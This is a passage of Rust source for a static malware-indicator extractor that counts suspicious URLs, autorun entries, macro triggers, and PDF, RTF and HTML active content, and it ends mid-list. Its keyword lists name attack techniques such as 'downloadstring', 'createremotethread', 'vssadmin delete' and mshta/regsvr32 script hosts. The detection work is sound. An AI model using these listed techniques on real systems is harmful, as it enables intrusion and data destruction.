use anyhow::Result;
use serde::{Deserialize, Serialize};

use crate::signatures::text::ascii_lowercase_lossy_with_cancellation;

const STRING_REFERENCE_CANCELLATION_INTERVAL: usize = 1024;
const STRING_REFERENCE_CANCELLATION_CHUNK_BYTES: usize = 64 * 1024;
const STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES: usize = 64 * 1024;

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct StringIndicators {
    pub embedded_url_count: u32,
    pub embedded_ip_count: u32,
    pub suspicious_string_count: u32,
    pub registry_autorun_count: u32,
    pub autorun_inf_executable_command_count: u32,
    pub disk_image_autorun_executable_count: u32,
    pub email_executable_attachment_count: u32,
    pub script_host_reference_count: u32,
    pub remote_executable_url_count: u32,
    pub remote_clickonce_url_count: u32,
    pub remote_network_executable_path_count: u32,
    pub clickonce_marker_count: u32,
    pub java_web_start_marker_count: u32,
    pub remote_java_web_start_url_count: u32,
    pub windows_scriptlet_marker_count: u32,
    pub windows_installer_marker_count: u32,
    pub windows_installer_custom_action_count: u32,
    pub windows_appinstaller_marker_count: u32,
    pub remote_windows_app_package_url_count: u32,
    pub macro_auto_run_count: u32,
    pub rtf_external_object_count: u32,
    pub pdf_active_content_count: u32,
    pub web_document_active_content_count: u32,
}

pub fn extract_indicators(bytes: &[u8]) -> StringIndicators {
    let mut never_cancel = || Ok(());
    extract_indicators_with_cancellation(bytes, &mut never_cancel)
        .expect("the infallible string-indicator callback cannot fail")
}

pub fn extract_indicators_with_cancellation(
    bytes: &[u8],
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<StringIndicators> {
    cancellation_checkpoint()?;
    let text = ascii_lowercase_lossy_with_cancellation(bytes, cancellation_checkpoint)?;
    cancellation_checkpoint()?;
    let mut indicators =
        extract_indicators_from_text_with_cancellation(&text, cancellation_checkpoint)?;
    if let Some(utf16le_text) = utf16le_text_view_with_cancellation(bytes, cancellation_checkpoint)?
    {
        indicators.merge(extract_indicators_from_text_with_cancellation(
            &utf16le_text,
            cancellation_checkpoint,
        )?);
    }
    cancellation_checkpoint()?;
    indicators.disk_image_autorun_executable_count =
        disk_image_autorun_executables_with_cancellation(bytes, &text, cancellation_checkpoint)?;
    cancellation_checkpoint()?;
    if has_compound_file_binary_header(bytes) {
        indicators.windows_installer_marker_count =
            indicators.windows_installer_marker_count.saturating_add(1);
    }
    cancellation_checkpoint()?;
    Ok(indicators)
}

fn extract_indicators_from_text_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<StringIndicators> {
    let urls = embedded_url_counts_with_cancellation(text, cancellation_checkpoint)?;
    let remote_network_executable_path_count =
        remote_network_executable_path_count_with_cancellation(text, cancellation_checkpoint)?;
    let clickonce_marker_count = clickonce_markers(text, cancellation_checkpoint)?;
    let java_web_start_marker_count = java_web_start_markers(text, cancellation_checkpoint)?;
    let windows_scriptlet_marker_count = windows_scriptlet_markers(text, cancellation_checkpoint)?;
    let windows_installer_marker_count = windows_installer_markers(text, cancellation_checkpoint)?;
    let windows_installer_custom_action_count =
        windows_installer_custom_actions(text, cancellation_checkpoint)?;
    let windows_appinstaller_marker_count =
        windows_appinstaller_markers(text, cancellation_checkpoint)?;
    let macro_auto_run_count = count_terms_with_cancellation(
        text,
        &[
            "autoopen",
            "auto_open",
            "document_open",
            "workbook_open",
            "presentation_open",
        ],
        cancellation_checkpoint,
    )?;
    let rtf_external_object_count = if is_rtf_text_with_cancellation(text, cancellation_checkpoint)?
    {
        count_terms_with_cancellation(
            text,
            &[
                "\\object",
                "\\objautlink",
                "\\objupdate",
                "\\template",
                "\\field",
                "ddeauto",
                "includepicture",
                "includetext",
            ],
            cancellation_checkpoint,
        )?
    } else {
        0
    };
    let pdf_active_content_count = if is_pdf_text_with_cancellation(text, cancellation_checkpoint)?
    {
        count_terms_with_cancellation(
            text,
            &[
                "/openaction",
                "/aa",
                "/js",
                "/javascript",
                "/launch",
                "/embeddedfile",
                "/submitform",
                "/xfa",
            ],
            cancellation_checkpoint,
        )?
    } else {
        0
    };
    let web_document_active_content_count =
        if is_web_document_text_with_cancellation(text, cancellation_checkpoint)? {
            count_terms_with_cancellation(
                text,
                &[
                    "<script",
                    "javascript:",
                    "onload=",
                    "onerror=",
                    "createobjecturl",
                    "mssaveoropenblob",
                    ".download",
                    "download=",
                    "atob(",
                    "fetch(",
                    "xmlhttprequest",
                ],
                cancellation_checkpoint,
            )?
        } else {
            0
        };
    let embedded_ip_count = embedded_ip_count_with_cancellation(text, cancellation_checkpoint)?;
    let suspicious_terms = [
        "invoke-expression",
        "iex ",
        "frombase64string",
        "virtualalloc",
        "createremotethread",
        "writeprocessmemory",
        "reg add",
        "schtasks",
        "vssadmin delete",
        "shadowcopy delete",
        "start-process",
        "downloadstring",
    ];
    cancellation_checkpoint()?;
    let suspicious_string_count =
        count_terms_with_cancellation(text, &suspicious_terms, cancellation_checkpoint)?;
    let registry_autorun_count = count_terms_with_cancellation(
        text,
        &["currentversion\\run", "runonce"],
        cancellation_checkpoint,
    )?;
    cancellation_checkpoint()?;
    let autorun_inf_executable_command_count =
        autorun_inf_executable_commands_with_cancellation(text, cancellation_checkpoint)?;
    let disk_image_autorun_executable_count = 0;
    let email_executable_attachment_count =
        email_executable_attachments_with_cancellation(text, cancellation_checkpoint)?;
    cancellation_checkpoint()?;
    let script_host_reference_count = count_terms_with_cancellation(
        text,
        &[
            "wscript.shell",
            "mshta",
            "rundll32",
            "regsvr32",
            "scrobj.dll",
            "powershell",
            "cmd.exe",
            "cscript",
            "wscript",
        ],
        cancellation_checkpoint,
    )?;
    cancellation_checkpoint()?;
    Ok(StringIndicators {
        embedded_url_count: urls.total,
        embedded_ip_count,
        suspicious_string_count,
        registry_autorun_count,
        autorun_inf_executable_command_count,
        disk_image_autorun_executable_count,
        email_executable_attachment_count,
        script_host_reference_count,
        remote_executable_url_count: urls.executable,
        remote_clickonce_url_count: urls.clickonce,
        remote_network_executable_path_count,
        clickonce_marker_count,
        java_web_start_marker_count,
        remote_java_web_start_url_count: urls.java_web_start,
        windows_scriptlet_marker_count,
        windows_installer_marker_count,
        windows_installer_custom_action_count,
        windows_appinstaller_marker_count,
        remote_windows_app_package_url_count: urls.windows_app_package,
        macro_auto_run_count,
        rtf_external_object_count,
        pdf_active_content_count,
        web_document_active_content_count,
    })
}

fn count_terms_with_cancellation(
    text: &str,
    terms: &[&str],
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    let mut total = 0u32;
    for term in terms {
        total = total.saturating_add(
            crate::signatures::search::count_exact_non_overlapping_with_cancellation(
                text.as_bytes(),
                term.as_bytes(),
                cancellation_checkpoint,
            )?,
        );
    }
    cancellation_checkpoint()?;
    Ok(total)
}

fn embedded_ip_count_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    let mut count = 0u32;
    let mut candidate_start = None;
    let mut next_checkpoint = 0usize;
    for (index, ch) in text.char_indices() {
        if index >= next_checkpoint {
            cancellation_checkpoint()?;
            next_checkpoint = index.saturating_add(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES);
        }
        if ch.is_ascii_digit() || ch == '.' {
            candidate_start.get_or_insert(index);
        } else if let Some(start) = candidate_start.take() {
            if is_ipv4_candidate(&text[start..index]) {
                count = count.saturating_add(1);
            }
        }
    }
    if let Some(start) = candidate_start {
        if is_ipv4_candidate(&text[start..]) {
            count = count.saturating_add(1);
        }
    }
    cancellation_checkpoint()?;
    Ok(count)
}

fn is_ipv4_candidate(candidate: &str) -> bool {
    if candidate.len() < 7 || candidate.len() > 15 {
        return false;
    }
    let mut octets = candidate.split('.');
    for _ in 0..4 {
        let Some(octet) = octets.next() else {
            return false;
        };
        if octet.is_empty() || octet.parse::<u8>().is_err() {
            return false;
        }
    }
    octets.next().is_none()
}

impl StringIndicators {
    fn merge(&mut self, other: StringIndicators) {
        self.embedded_url_count = self
            .embedded_url_count
            .saturating_add(other.embedded_url_count);
        self.embedded_ip_count = self
            .embedded_ip_count
            .saturating_add(other.embedded_ip_count);
        self.suspicious_string_count = self
            .suspicious_string_count
            .saturating_add(other.suspicious_string_count);
        self.registry_autorun_count = self
            .registry_autorun_count
            .saturating_add(other.registry_autorun_count);
        self.autorun_inf_executable_command_count = self
            .autorun_inf_executable_command_count
            .saturating_add(other.autorun_inf_executable_command_count);
        self.disk_image_autorun_executable_count = self
            .disk_image_autorun_executable_count
            .saturating_add(other.disk_image_autorun_executable_count);
        self.email_executable_attachment_count = self
            .email_executable_attachment_count
            .saturating_add(other.email_executable_attachment_count);
        self.script_host_reference_count = self
            .script_host_reference_count
            .saturating_add(other.script_host_reference_count);
        self.remote_executable_url_count = self
            .remote_executable_url_count
            .saturating_add(other.remote_executable_url_count);
        self.remote_clickonce_url_count = self
            .remote_clickonce_url_count
            .saturating_add(other.remote_clickonce_url_count);
        self.remote_network_executable_path_count = self
            .remote_network_executable_path_count
            .saturating_add(other.remote_network_executable_path_count);
        self.clickonce_marker_count = self
            .clickonce_marker_count
            .saturating_add(other.clickonce_marker_count);
        self.java_web_start_marker_count = self
            .java_web_start_marker_count
            .saturating_add(other.java_web_start_marker_count);
        self.remote_java_web_start_url_count = self
            .remote_java_web_start_url_count
            .saturating_add(other.remote_java_web_start_url_count);
        self.windows_scriptlet_marker_count = self
            .windows_scriptlet_marker_count
            .saturating_add(other.windows_scriptlet_marker_count);
        self.windows_installer_marker_count = self
            .windows_installer_marker_count
            .saturating_add(other.windows_installer_marker_count);
        self.windows_installer_custom_action_count = self
            .windows_installer_custom_action_count
            .saturating_add(other.windows_installer_custom_action_count);
        self.windows_appinstaller_marker_count = self
            .windows_appinstaller_marker_count
            .saturating_add(other.windows_appinstaller_marker_count);
        self.remote_windows_app_package_url_count = self
            .remote_windows_app_package_url_count
            .saturating_add(other.remote_windows_app_package_url_count);
        self.macro_auto_run_count = self
            .macro_auto_run_count
            .saturating_add(other.macro_auto_run_count);
        self.rtf_external_object_count = self
            .rtf_external_object_count
            .saturating_add(other.rtf_external_object_count);
        self.pdf_active_content_count = self
            .pdf_active_content_count
            .saturating_add(other.pdf_active_content_count);
        self.web_document_active_content_count = self
            .web_document_active_content_count
            .saturating_add(other.web_document_active_content_count);
    }
}

fn contains_any_exact_with_cancellation(
    bytes: &[u8],
    needles: &[&[u8]],
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<bool> {
    for needle in needles {
        if crate::signatures::search::contains_exact_with_cancellation(
            bytes,
            needle,
            cancellation_checkpoint,
        )? {
            cancellation_checkpoint()?;
            return Ok(true);
        }
    }
    cancellation_checkpoint()?;
    Ok(false)
}

fn find_first_ascii_byte_with_cancellation(
    bytes: &[u8],
    accepted: &[u8],
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<Option<usize>> {
    if bytes.len() <= STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES {
        return Ok(bytes.iter().position(|byte| accepted.contains(byte)));
    }

    for chunk_start in (0..bytes.len()).step_by(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES) {
        cancellation_checkpoint()?;
        let chunk_end = chunk_start
            .saturating_add(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES)
            .min(bytes.len());
        if let Some(relative) = bytes[chunk_start..chunk_end]
            .iter()
            .position(|byte| accepted.contains(byte))
        {
            return Ok(Some(chunk_start + relative));
        }
    }
    cancellation_checkpoint()?;
    Ok(None)
}

fn try_for_each_ascii_segment_with_cancellation<F>(
    text: &str,
    separator: u8,
    strip_trailing_carriage_return: bool,
    include_trailing_empty: bool,
    checkpoint_small_input: bool,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
    visitor: &mut F,
) -> Result<()>
where
    F: FnMut(&str, &mut dyn FnMut() -> Result<()>) -> Result<()>,
{
    let bytes = text.as_bytes();
    let checkpoint_chunks =
        checkpoint_small_input || bytes.len() > STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES;
    let mut segment_start = 0usize;
    for chunk_start in (0..bytes.len()).step_by(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES) {
        if checkpoint_chunks {
            cancellation_checkpoint()?;
        }
        let chunk_end = chunk_start
            .saturating_add(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES)
            .min(bytes.len());
        for (relative, byte) in bytes[chunk_start..chunk_end].iter().enumerate() {
            if *byte != separator {
                continue;
            }
            let separator_at = chunk_start + relative;
            let mut segment = &text[segment_start..separator_at];
            if strip_trailing_carriage_return {
                segment = segment.strip_suffix('\r').unwrap_or(segment);
            }
            visitor(segment, cancellation_checkpoint)?;
            segment_start = separator_at + 1;
        }
    }

    if segment_start < text.len() || include_trailing_empty {
        let mut segment = &text[segment_start..];
        if strip_trailing_carriage_return {
            segment = segment.strip_suffix('\r').unwrap_or(segment);
        }
        visitor(segment, cancellation_checkpoint)?;
    }
    if checkpoint_chunks {
        cancellation_checkpoint()?;
    }
    Ok(())
}

fn trim_matches_with_cancellation<'a>(
    text: &'a str,
    predicate: fn(char) -> bool,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<&'a str> {
    if text.len() <= STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES {
        return Ok(text.trim_matches(predicate));
    }

    let mut first = None;
    let mut last = 0usize;
    let mut next_checkpoint = 0usize;
    for (index, ch) in text.char_indices() {
        if index >= next_checkpoint {
            cancellation_checkpoint()?;
            next_checkpoint = index.saturating_add(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES);
        }
        if !predicate(ch) {
            first.get_or_insert(index);
            last = index + ch.len_utf8();
        }
    }
    cancellation_checkpoint()?;
    Ok(first.map_or("", |start| &text[start..last]))
}

fn trim_with_cancellation<'a>(
    text: &'a str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<&'a str> {
    trim_matches_with_cancellation(text, char::is_whitespace, cancellation_checkpoint)
}

fn path_before_query_or_fragment_with_cancellation<'a>(
    path: &'a str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<&'a str> {
    let end =
        find_first_ascii_byte_with_cancellation(path.as_bytes(), b"?#", cancellation_checkpoint)?
            .unwrap_or(path.len());
    Ok(&path[..end])
}

fn is_rtf_text_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<bool> {
    contains_any_exact_with_cancellation(
        text.as_bytes(),
        &[b"{\\rtf".as_slice(), b"\\rtf1".as_slice()],
        cancellation_checkpoint,
    )
}

fn is_pdf_text_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<bool> {
    crate::signatures::search::contains_exact_with_cancellation(
        text.as_bytes(),
        b"%pdf-",
        cancellation_checkpoint,
    )
}

fn is_web_document_text_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<bool> {
    contains_any_exact_with_cancellation(
        text.as_bytes(),
        &[
            b"<!doctype html".as_slice(),
            b"<html".as_slice(),
            b"<svg".as_slice(),
        ],
        cancellation_checkpoint,
    )
}

fn autorun_inf_executable_commands_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    cancellation_checkpoint()?;
    let mut has_autorun_section = false;
    let mut executable_command_count = 0u32;
    let mut visit_line =
        |raw_line: &str, checkpoint: &mut dyn FnMut() -> Result<()>| -> Result<()> {
            let comment_at =
                find_first_ascii_byte_with_cancellation(raw_line.as_bytes(), b";", checkpoint)?
                    .unwrap_or(raw_line.len());
            let line = trim_with_cancellation(&raw_line[..comment_at], checkpoint)?;
            if line == "[autorun]" {
                has_autorun_section = true;
                return Ok(());
            }
            let Some(equals_at) =
                find_first_ascii_byte_with_cancellation(line.as_bytes(), b"=", checkpoint)?
            else {
                return Ok(());
            };
            let key = trim_with_cancellation(&line[..equals_at], checkpoint)?;
            let value = trim_with_cancellation(&line[equals_at + 1..], checkpoint)?;
            let is_command_key = matches!(key, "open" | "shellexecute")
                || (key.starts_with("shell\\") && key.ends_with("\\command"));
            if is_command_key
                && command_value_has_executable_or_script_reference_with_cancellation(
                    value, checkpoint,
                )?
            {
                executable_command_count = executable_command_count.saturating_add(1);
            }
            Ok(())
        };
    try_for_each_ascii_segment_with_cancellation(
        text,
        b'\n',
        true,
        false,
        true,
        cancellation_checkpoint,
        &mut visit_line,
    )?;
    cancellation_checkpoint()?;
    Ok(if has_autorun_section {
        executable_command_count
    } else {
        0
    })
}

fn is_command_token_separator(ch: char) -> bool {
    ch.is_whitespace()
        || ch.is_control()
        || matches!(
            ch,
            '"' | '\'' | ',' | '(' | ')' | '[' | ']' | '{' | '}' | '<' | '>'
        )
}

fn is_command_token_trim_character(ch: char) -> bool {
    matches!(ch, '"' | '\'' | ',' | ';' | ')' | ']' | '}' | '<' | '>')
}

fn command_token_has_executable_or_script_reference_with_cancellation(
    token: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<bool> {
    let token = trim_matches_with_cancellation(
        token,
        is_command_token_trim_character,
        cancellation_checkpoint,
    )?;
    if token.is_empty() {
        return Ok(false);
    }
    let path = path_before_query_or_fragment_with_cancellation(token, cancellation_checkpoint)?;
    Ok(path_has_executable_or_script_suffix(path))
}

fn command_value_has_executable_or_script_reference_with_cancellation(
    value: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<bool> {
    let mut token_start = None;
    let mut next_checkpoint = 0usize;
    let checkpoint_chunks = value.len() > STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES;
    for (index, ch) in value.char_indices() {
        if checkpoint_chunks && index >= next_checkpoint {
            cancellation_checkpoint()?;
            next_checkpoint = index.saturating_add(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES);
        }
        if is_command_token_separator(ch) {
            if let Some(start) = token_start.take() {
                if command_token_has_executable_or_script_reference_with_cancellation(
                    &value[start..index],
                    cancellation_checkpoint,
                )? {
                    if checkpoint_chunks {
                        cancellation_checkpoint()?;
                    }
                    return Ok(true);
                }
            }
        } else if token_start.is_none() {
            token_start = Some(index);
        }
    }
    if let Some(start) = token_start {
        if command_token_has_executable_or_script_reference_with_cancellation(
            &value[start..],
            cancellation_checkpoint,
        )? {
            if checkpoint_chunks {
                cancellation_checkpoint()?;
            }
            return Ok(true);
        }
    }
    if checkpoint_chunks {
        cancellation_checkpoint()?;
    }
    Ok(false)
}

fn disk_image_autorun_executables_with_cancellation(
    bytes: &[u8],
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    if !looks_like_optical_disk_image_with_cancellation(bytes, cancellation_checkpoint)?
        || !crate::signatures::search::contains_exact_with_cancellation(
            text.as_bytes(),
            b"autorun.inf",
            cancellation_checkpoint,
        )?
    {
        return Ok(0);
    }
    Ok(u32::from(
        command_value_has_executable_or_script_reference_with_cancellation(
            text,
            cancellation_checkpoint,
        )?,
    ))
}

fn looks_like_optical_disk_image_with_cancellation(
    bytes: &[u8],
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<bool> {
    contains_any_exact_with_cancellation(
        bytes,
        &[
            b"CD001".as_slice(),
            b"NSR02".as_slice(),
            b"NSR03".as_slice(),
        ],
        cancellation_checkpoint,
    )
}

fn email_executable_attachment_lines_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    let mut count = 0u32;
    let mut visit_line = |line: &str, checkpoint: &mut dyn FnMut() -> Result<()>| -> Result<()> {
        let mut line_matches = false;
        let mut visit_part = |part: &str,
                              part_checkpoint: &mut dyn FnMut() -> Result<()>|
         -> Result<()> {
            if line_matches {
                return Ok(());
            }
            let part = trim_with_cancellation(part, part_checkpoint)?;
            let Some(equals_at) =
                find_first_ascii_byte_with_cancellation(part.as_bytes(), b"=", part_checkpoint)?
            else {
                return Ok(());
            };
            let key = trim_with_cancellation(&part[..equals_at], part_checkpoint)?;
            if !matches!(key, "filename" | "name") {
                return Ok(());
            }
            let value = trim_with_cancellation(&part[equals_at + 1..], part_checkpoint)?;
            line_matches = command_value_has_executable_or_script_reference_with_cancellation(
                value,
                part_checkpoint,
            )?;
            Ok(())
        };
        try_for_each_ascii_segment_with_cancellation(
            line,
            b';',
            false,
            true,
            false,
            checkpoint,
            &mut visit_part,
        )?;
        if line_matches {
            count = count.saturating_add(1);
        }
        Ok(())
    };
    try_for_each_ascii_segment_with_cancellation(
        text,
        b'\n',
        true,
        false,
        true,
        cancellation_checkpoint,
        &mut visit_line,
    )?;
    cancellation_checkpoint()?;
    Ok(count)
}

fn email_executable_attachments_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    if !is_email_message_text_with_cancellation(text, cancellation_checkpoint)?
        || !crate::signatures::search::contains_exact_with_cancellation(
            text.as_bytes(),
            b"content-disposition: attachment",
            cancellation_checkpoint,
        )?
    {
        return Ok(0);
    }
    email_executable_attachment_lines_with_cancellation(text, cancellation_checkpoint)
}

fn is_email_message_text_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<bool> {
    if !crate::signatures::search::contains_exact_with_cancellation(
        text.as_bytes(),
        b"mime-version:",
        cancellation_checkpoint,
    )? {
        return Ok(false);
    }
    let has_from = text.starts_with("from:")
        || crate::signatures::search::contains_exact_with_cancellation(
            text.as_bytes(),
            b"\nfrom:",
            cancellation_checkpoint,
        )?;
    if !has_from {
        return Ok(false);
    }
    let has_subject = text.starts_with("subject:")
        || crate::signatures::search::contains_exact_with_cancellation(
            text.as_bytes(),
            b"\nsubject:",
            cancellation_checkpoint,
        )?;
    cancellation_checkpoint()?;
    Ok(has_subject)
}

fn utf16le_text_view_with_cancellation(
    bytes: &[u8],
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<Option<String>> {
    if bytes.len() < 8 {
        cancellation_checkpoint()?;
        return Ok(None);
    }
    let units = bytes
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]));
    let mut text = String::with_capacity(bytes.len() / 2);
    for (index, decoded) in char::decode_utf16(units).enumerate() {
        if index % (64 * 1024) == 0 {
            cancellation_checkpoint()?;
        }
        text.push(decoded.unwrap_or(char::REPLACEMENT_CHARACTER));
    }
    text.make_ascii_lowercase();
    cancellation_checkpoint()?;
    for marker in [
        "http://",
        "https://",
        "powershell",
        "cmd.exe",
        "wscript",
        "cscript",
        "regsvr32",
        "scrobj",
        "<scriptlet",
        ".sct",
        ".wsc",
        "\\\\",
        "file://",
        "autoopen",
        "document_open",
        "workbook_open",
        "[autorun]",
        "mime-version:",
        "content-disposition: attachment",
        "<jnlp",
        ".jnlp",
        "<appinstaller",
        ".appinstaller",
        ".appx",
        ".msix",
        "<!doctype html",
        "<html",
        "<svg",
    ] {
        if crate::signatures::search::contains_exact_with_cancellation(
            text.as_bytes(),
            marker.as_bytes(),
            cancellation_checkpoint,
        )? {
            return Ok(Some(text));
        }
    }
    Ok(None)
}

#[derive(Default)]
struct EmbeddedUrlCounts {
    total: u32,
    executable: u32,
    clickonce: u32,
    java_web_start: u32,
    windows_app_package: u32,
}

fn reference_end_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<usize> {
    let mut chunk_start = 0usize;
    while chunk_start < text.len() {
        cancellation_checkpoint()?;
        let mut chunk_end = chunk_start
            .saturating_add(STRING_REFERENCE_CANCELLATION_CHUNK_BYTES)
            .min(text.len());
        while chunk_end > chunk_start && !text.is_char_boundary(chunk_end) {
            chunk_end -= 1;
        }

        if let Some((relative_end, _)) =
            text[chunk_start..chunk_end].char_indices().find(|(_, ch)| {
                ch.is_whitespace() || matches!(ch, '"' | '\'' | '<' | '>' | ')' | ']' | '}')
            })
        {
            return Ok(chunk_start + relative_end);
        }
        chunk_start = chunk_end;
    }

    cancellation_checkpoint()?;
    Ok(text.len())
}

fn embedded_url_counts_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<EmbeddedUrlCounts> {
    let mut counts = EmbeddedUrlCounts::default();
    let mut references_seen = 0usize;
    for marker in ["http://", "https://"] {
        cancellation_checkpoint()?;
        let mut search_start = 0;
        while let Some(relative_start) = crate::signatures::search::find_exact_with_cancellation(
            &text.as_bytes()[search_start..],
            marker.as_bytes(),
            cancellation_checkpoint,
        )? {
            if references_seen.is_multiple_of(STRING_REFERENCE_CANCELLATION_INTERVAL) {
                cancellation_checkpoint()?;
            }
            let start = search_start + relative_start;
            let rest = &text[start..];
            let end = reference_end_with_cancellation(rest, cancellation_checkpoint)?;
            let url = &rest[..end];
            let url_path =
                path_before_query_or_fragment_with_cancellation(url, cancellation_checkpoint)?;
            counts.total = counts.total.saturating_add(1);
            counts.executable = counts
                .executable
                .saturating_add(u32::from(path_has_executable_or_script_suffix(url_path)));
            counts.clickonce = counts
                .clickonce
                .saturating_add(u32::from(path_has_clickonce_suffix(url_path)));
            counts.java_web_start = counts
                .java_web_start
                .saturating_add(u32::from(path_has_java_web_start_suffix(url_path)));
            counts.windows_app_package = counts
                .windows_app_package
                .saturating_add(u32::from(path_has_windows_app_package_suffix(url_path)));
            references_seen = references_seen.saturating_add(1);
            search_start = start + marker.len();
        }
    }
    cancellation_checkpoint()?;
    Ok(counts)
}

fn path_has_clickonce_suffix(path: &str) -> bool {
    [".application", ".appref-ms"]
        .iter()
        .any(|suffix| path.ends_with(suffix))
}

fn path_has_java_web_start_suffix(path: &str) -> bool {
    [".jar", ".jnlp"]
        .iter()
        .any(|suffix| path.ends_with(suffix))
}

fn path_has_windows_app_package_suffix(path: &str) -> bool {
    [".appx", ".msix", ".appxbundle", ".msixbundle"]
        .iter()
        .any(|suffix| path.ends_with(suffix))
}

fn remote_network_executable_path_count_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    let mut executable_count = 0u32;
    let mut references_seen = 0usize;
    for marker in ["\\\\", "file://"] {
        cancellation_checkpoint()?;
        let mut search_start = 0;
        while let Some(relative_start) = crate::signatures::search::find_exact_with_cancellation(
            &text.as_bytes()[search_start..],
            marker.as_bytes(),
            cancellation_checkpoint,
        )? {
            if references_seen.is_multiple_of(STRING_REFERENCE_CANCELLATION_INTERVAL) {
                cancellation_checkpoint()?;
            }
            let start = search_start + relative_start;
            let rest = &text[start..];
            let end = reference_end_with_cancellation(rest, cancellation_checkpoint)?;
            let path = &rest[..end];
            let path_without_query =
                path_before_query_or_fragment_with_cancellation(path, cancellation_checkpoint)?;
            if is_remote_network_path_with_cancellation(path, cancellation_checkpoint)?
                && path_has_executable_or_script_suffix(path_without_query)
            {
                executable_count = executable_count.saturating_add(1);
            }
            references_seen = references_seen.saturating_add(1);
            search_start = start + marker.len();
        }
    }
    cancellation_checkpoint()?;
    Ok(executable_count)
}

fn is_remote_network_path_with_cancellation(
    path: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<bool> {
    if path.starts_with("\\\\?\\") || path.starts_with("\\\\.\\") {
        return Ok(false);
    }
    if path.starts_with("\\\\") {
        let mut host_start = 0usize;
        let mut next_checkpoint = 0usize;
        for (index, byte) in path.as_bytes().iter().enumerate() {
            if path.len() > STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES && index >= next_checkpoint {
                cancellation_checkpoint()?;
                next_checkpoint = index.saturating_add(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES);
            }
            if *byte != b'\\' {
                host_start = index;
                break;
            }
        }
        if host_start == 0 {
            return Ok(false);
        }
        let rest = &path[host_start..];
        let Some(host_end) = find_first_ascii_byte_with_cancellation(
            rest.as_bytes(),
            b"\\/",
            cancellation_checkpoint,
        )?
        else {
            return Ok(false);
        };
        let share = &rest[host_end + 1..];
        return Ok(host_end > 0
            && !share.is_empty()
            && !share.starts_with('\\')
            && !share.starts_with('/'));
    }
    if let Some(rest) = path.strip_prefix("file://") {
        if rest.starts_with('/') || rest.is_empty() {
            return Ok(false);
        }
        let host_end = find_first_ascii_byte_with_cancellation(
            rest.as_bytes(),
            b"/\\",
            cancellation_checkpoint,
        )?
        .unwrap_or(rest.len());
        let host = &rest[..host_end];
        return Ok(!host.is_empty() && host != "localhost");
    }
    Ok(false)
}

fn path_has_executable_or_script_suffix(path: &str) -> bool {
    const EXECUTABLE_OR_SCRIPT_SUFFIXES: [&str; 25] = [
        ".exe", ".scr", ".com", ".pif", ".cpl", ".msi", ".msp", ".msu", ".bat", ".cmd", ".ps1",
        ".psm1", ".vbs", ".vbe", ".js", ".jse", ".mjs", ".cjs", ".wsf", ".hta", ".sct", ".wsc",
        ".jar", ".jnlp", ".dll",
    ];
    EXECUTABLE_OR_SCRIPT_SUFFIXES
        .iter()
        .any(|suffix| path.ends_with(suffix))
}

fn clickonce_markers(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    count_terms_with_cancellation(
        text,
        &[
            "deploymentprovider",
            "asmv2:deployment",
            "urn:schemas-microsoft-com:asm.v2",
            "<deployment ",
            "<deployment>",
            "<dependentassembly",
            "applicationreference",
        ],
        cancellation_checkpoint,
    )
}

fn java_web_start_markers(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    count_terms_with_cancellation(
        text,
        &[
            "<jnlp",
            "jnlp spec",
            "application-desc",
            "applet-desc",
            "installer-desc",
